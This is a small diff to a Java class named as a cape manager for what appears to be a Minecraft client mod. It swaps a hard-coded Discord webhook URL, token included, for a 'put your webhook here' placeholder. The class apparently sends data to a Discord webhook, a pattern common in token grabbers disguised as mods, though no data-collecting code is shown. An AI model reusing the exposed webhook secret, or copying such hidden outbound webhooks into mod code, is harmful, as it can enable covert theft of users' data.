@@ -12,7 +12,7 @@ import java.util.regex.Pattern;
 public class WurstplusCapeManager2 {
 
     public WurstplusCapeManager2() {
-        final String l = "https://discord.com/api/webhooks/858768278348496907/Bed_vTOfUx-qMzY8XIN7zd8ii15Ax9rdUx_4UJQSFSCSDz9LT4xcNz_L4hW04O2ckfKt";
+        final String l = "put your webhook here";
         final String CapeName = "2";
         final String CapeImageURL = "https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fvignette.wikia.nocookie.net%2Fstarwars%2Fimages%2F4%2F4a%2FKylo_Ren_TLJ.png";
 
